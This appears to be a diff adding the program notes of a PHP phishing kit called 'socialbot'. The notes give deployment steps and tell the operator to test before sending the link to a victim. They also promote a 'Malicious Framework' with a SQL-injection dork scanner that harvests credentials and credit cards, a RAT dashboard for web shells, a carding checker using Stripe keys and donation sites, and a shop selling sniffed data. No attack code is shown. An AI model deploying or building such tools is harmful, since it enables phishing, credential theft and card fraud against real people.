@@ -1,0 +1,43 @@
+
+
+/*
+#---------------------- PROGRAM NOTES ------------------------->
+# use iframe only if the site doesn't load or if css is messed up.
+# Malicious Engineer has a 80 - 99% success rate
+
+
+# drag drop and deploy
+just put this folder in your localhost folder provate pc or upload it to 
+your public html folder once you're done
+visit http://localhost:(your.open.port)/socialbot/social.bot.php or 
+https://yourhost.com/socialbot/social.bot.php if you placed folder on a domain
+
+
+# always test before you send link to victim, 
+# You can change the file name (socialbot.php) to match the site better 
+# visit hackerlocal.us to buy information thats already sniffed.
+*/
+
+
+/*/ OTHER NOTES 
+This is part of the < Malicious Framework >
+I will release Malicious once Im done with the GUI. 
+
+So far it has ... 
+
+*- Malicious Webscanner   [ advanced algorithm randomizes and
+scans a dork list for vuln sites for SQL Injections 
+a list of 10 dorks can produce over 100 searches 
+scans for usernames, passwords, credit cards identity information as well..]
+
+Malicious Dashboard *-  RAT with Modern GUI for web shells
+
+Malicious Credit Card Checker - using a combination of guzzle,puppeteer,and stripe  
+to mass check credit cards using over 15 sk_keys and counting plus so far 34 donation sites 
+we try to add at least two sites weekly to our checkers database 
+
+Malicious Engineer 
+Socialbot is the step child to Malicious Engineer, its stripped down to be useable 
+across most hosting services due to most hosting services not supporting PHP ^8.0
+I've taken alot away from this to make it useable for the regular user 
+and make it available for test before I release the Malicious Dashboard GUI.
